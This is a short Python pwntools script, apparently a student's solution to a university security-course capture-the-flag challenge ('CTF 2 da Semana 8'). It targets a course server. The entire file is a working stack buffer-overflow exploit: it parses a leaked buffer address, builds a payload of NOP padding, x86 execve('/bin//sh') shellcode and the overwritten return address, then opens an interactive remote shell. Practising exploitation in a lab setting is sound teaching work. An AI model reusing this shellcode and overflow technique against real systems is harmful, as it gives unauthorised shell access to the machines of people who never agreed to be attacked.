# Exploit usado no CTF 2 da Semana 8

from pwn import *
import re

NOP = 0x90
BUFFER_SIZE = 100 + 4 + 4 + 4
ADDRESS_REGEX = "0x(.+).\n"
SHELL_CODE = (
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"
  "\x0b\xcd\x80" 
).encode('latin-1')

ctf_server = remote('ctf-fsi.fe.up.pt', 4001)

content = ctf_server.recvuntil(b'input:').decode()
buffer_address = bytearray.fromhex(re.search(ADDRESS_REGEX, content).group(1))
buffer_address.reverse()

exploit = bytearray(NOP for _ in range(BUFFER_SIZE)) 
exploit[: len(SHELL_CODE)] = SHELL_CODE
exploit[BUFFER_SIZE - len(buffer_address):] = buffer_address

ctf_server.sendline(exploit)
ctf_server.interactive()